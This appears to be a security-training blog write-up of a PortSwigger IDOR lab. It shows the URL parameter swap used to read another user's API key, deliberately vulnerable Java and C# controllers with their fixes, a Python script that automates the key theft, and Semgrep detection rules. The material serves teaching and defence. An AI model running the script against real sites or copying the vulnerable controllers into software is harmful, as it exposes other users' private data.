---
title: "Lab 07 - User ID controlled by request parameter"
date: 2025-12-17
categories: [portswigger, access_control]
tags: [IDOR] 
image: portswigger.png
media_subpath: /assets/img/posts/2025-12-17-lab07_access_control/
---

## 1. Executive Summary

**Vulnerability:** Insecure Direct Object Reference (IDOR).

**Description:** The application exposes a direct reference to an internal database object (the User ID) in the URL. When fetching user data, the backend uses this ID to query the database but fails to verify if the currently logged-in user is *authorized* to view that specific ID.

**Impact:** Horizontal Privilege Escalation. A user can view the private data (PII, API keys) of any other user simply by putting target username as ar request parameter.

## 2. The Attack

**Objective:** Steal the API key of the user `carlos`.

1. **Reconnaissance:** I logged in with my credentials (`wiener` / `peter`) and clicked on the "My Account" page.
2. **Observation:** I noticed the URL pattern: `/my-account?id=wiener`. The application is explicitly asking "Which user's data should I show?" via the `id` query parameter.
3. **Exploitation:** I captured the request in Burp Repeater. I changed the parameter from `id=wiener` to `id=carlos`.
4. **Result:** The server returned the account page for `carlos` without any error.
5. **Loot:** I located the API key in the response body (`Your API Key is: ...`) and submitted it to solve the lab.

## 3. Code Review

**Vulnerability Analysis (Explanation):**
The code below uses a **Data Access Object (DAO)** or Repository pattern. The Controller accepts an `id` string from the user and passes it straight to the database.

- **The Flaw:** The code assumes that because the user is *logged in* (Authenticated), they are allowed to see *any* data they ask for. It forgets Authorization (Ownership check).
- **The Reality:** The server is acting like a dumb file retrieval system: "You want file 'carlos'? Here is file 'carlos'." It never asks, "Are you arguably 'carlos'?"

### Java (Spring Boot)

```java
@Controller
public class AccountController {

    @Autowired
    private UserRepository userRepository;

    // VULNERABLE: The method takes 'id' from the URL parameters.
    @GetMapping("/my-account")
    public String getAccountPage(@RequestParam("id") String userId, Model model) {
        
        // The application trusts the input 'userId' implicitly.
        User user = userRepository.findByUsername(userId);
        
        model.addAttribute("user", user);
        return "account_page";
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`@RequestParam("id") String userId`**: This annotation tells Spring to look at the URL query string (e.g., `?id=carlos`), extract the value `carlos`, and assign it to the Java variable `userId`.
- **`userRepository.findByUsername(userId)`**: This is the critical moment. The controller takes that user-supplied string and hands it directly to the database layer. The query becomes `SELECT * FROM users WHERE username = 'carlos'`.
- **Missing Check**: Nowhere in this function does the code ask the **Security Context** (the session): "Who is currently logged in?" It acts purely on the user's input.

### C# (ASP.NET Core)

```csharp
[Authorize] // Ensures the user is logged in, but not WHICH user.
public class AccountController : Controller
{
    // VULNERABLE: The action accepts the 'id' parameter from the Query String.
    [HttpGet("my-account")]
    public IActionResult GetAccount(string id)
    {
        // The 'id' variable is populated automatically by Model Binding.
        var userProfile = _userService.GetProfile(id);

        return View(userProfile);
    }
}
```

**Technical Flow & Syntax Explanation:**

- **`[Authorize]`**: This attribute acts as a bouncer. It checks "Is this user logged in?" If yes, it lets them in. It does **not** check "Is this user allowed to see data for `carlos`?"
- **`public IActionResult GetAccount(string id)`**: ASP.NET Core's "Model Binder" sees the parameter name `id` and automatically looks for `?id=...` in the URL to populate it.
- **`_userService.GetProfile(id)`**: The code blindly passes the requested ID to the service layer. If I request `id=carlos`, the service fetches Carlos. The controller then renders the View with that data.

### Mock PR Comment

The `getAccountPage` method accepts a `userId` parameter directly from the client request and uses it to retrieve user details. This allows any authenticated user to view the profile of any other user by changing the parameter.

**Recommendation:** Do not accept the User ID from the client for endpoints that show the "current user's" data. Instead, retrieve the User ID securely from the server-side session (e.g., `Principal` or `User.Identity`).

## 4. The Fix

**Explanation of the Fix:**
To fix IDOR, we stop trusting the client to tell us "who they are." We already know who they are—we stored that information in the **Session** or **JWT** when they logged in. We ignore the URL parameter entirely and fetch the ID from the Security Context.

### Secure Java

```java
@GetMapping("/my-account")
// We inject the 'Principal', which holds the secure session info.
public String getAccountPage(Principal principal, Model model) {
    
    // SECURE: We ignore any '?id=' parameter.
    // We ask the Principal: "Who is logged in right now?"
    String loggedInUsername = principal.getName();
    
    // We use THAT username to query the database.
    User user = userRepository.findByUsername(loggedInUsername);
    
    model.addAttribute("user", user);
    return "account_page";
}
```

**Technical Flow & Syntax Explanation:**

- **`Principal principal`**: We add this argument to the method signature. Spring Security automatically injects the currently authenticated user's security context into this object. This data comes from the server-side session, so it cannot be spoofed by the client.
- **`principal.getName()`**: This method retrieves the username (or ID) stored in the secure session.
- **Parameter Removal**: Notice there is no `@RequestParam("id")` anymore. Even if the attacker sends `?id=carlos`, the application ignores it and only queries the database for the user found in `principal.getName()`.

### Secure C#

```csharp
[Authorize]
[HttpGet("my-account")]
public IActionResult GetAccount()
{
    // SECURE: Retrieve the ID from the ClaimsPrincipal (User property).
    // This data comes from the encrypted Auth Cookie/Token.
    var currentUserId = User.FindFirst(ClaimTypes.NameIdentifier)?.Value;

    var userProfile = _userService.GetProfile(currentUserId);

    return View(userProfile);
}
```

**Technical Flow & Syntax Explanation:**

- **`User` (ClaimsPrincipal)**: In ASP.NET Core controllers, the `User` property provides access to the current user's claims (identity data). This data is populated from the encrypted authentication cookie or JWT token.
- **`FindFirst(ClaimTypes.NameIdentifier)`**: We programmatically extract the unique ID (Subject) from the user's claims. This ensures we are getting the ID of the person *holding the valid session key*.
- **Ignoring Input**: The method `GetAccount()` no longer takes any arguments. The ID is derived internally, making the `?id=carlos` attack impossible because the application never reads the URL parameter.

## 5. Automation

*A Python script that logs in and attempts to access the data of a victim user (`carlos`) to prove IDOR exists.*

```python
#!/usr/bin/env python3
import argparse
import re
import requests

def exploit_idor(url, session_cookie, victim_username):
    target_path = "/my-account"
    params = {"id": victim_username}
    cookies = {"session": session_cookie}

    resp = requests.get(f"{url.rstrip('/')}{target_path}", params=params, cookies=cookies, allow_redirects=True, timeout=10)
    print(f"[*] Final URL: {resp.url} | Status: {resp.status_code}")

    m = re.search(r"Your API Key is:\s*([A-Za-z0-9]+)", resp.text)
    if m:
        print(f"[+] API KEY FOUND for {victim_username}: {m.group(1)}")
    else:
        print("[-] API key not found. (Likely not authenticated / got a different page.)")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url", help="Base URL, e.g. https://target.net")
    ap.add_argument("session", help="session cookie value (from your browser)")
    ap.add_argument("victim", help="victim id/username, e.g. carlos")
    args = ap.parse_args()
    exploit_idor(args.url, args.session, args.victim)

if __name__ == "__main__":
    main()
```

## 6. Static Analysis (Semgrep)

*Rules to detect Controllers that take an ID as a parameter and use it in a Repository call, which is a strong heuristic for potential IDOR.*

**The Logic**
We want to flag code where:

1. A method is an endpoint (Controller).
2. It takes an argument (like `id` or `userId`).
3. It uses that *exact same argument* to call a "Find" or "Get" method in a repository/service.
4. It does NOT compare that argument to the current session user.

### Java Rule

```yaml
rules:
  - id: java-potential-idor
    languages: [java]
    message: |
      Potential IDOR detected. The controller takes a parameter '$ID' 
      and uses it directly in a database lookup '$REPO.find...($ID)'. 
      Ensure you verify that the logged-in user owns this record.
    severity: WARNING
    patterns:
      - pattern-inside: |
          @$CONTROLLER
          class $CLASS { ... }
      - pattern: |
          public $RET $METHOD(..., $TYPE $ID, ...) {
            ...
            $REPO.$FIND(..., $ID, ...);
            ...
          }
      - metavariable-regex:
          metavariable: $FIND
          regex: ^(find|get|load).*
```

### C# Rule

```yaml
rules:
  - id: csharp-potential-idor
    languages: [csharp]
    message: "Potential IDOR: Controller action uses input parameter directly in lookup service."
    severity: WARNING
    patterns:
      - pattern-inside: |
          public class $CONTROLLER : Controller { ... }
      - pattern: |
          public IActionResult $METHOD(..., $TYPE $ID, ...) {
            ...
            $SERVICE.$LOOKUP($ID);
            ...
          }
      - metavariable-regex:
          metavariable: $LOOKUP
          regex: ^(Get|Find|Retrieve).*
```
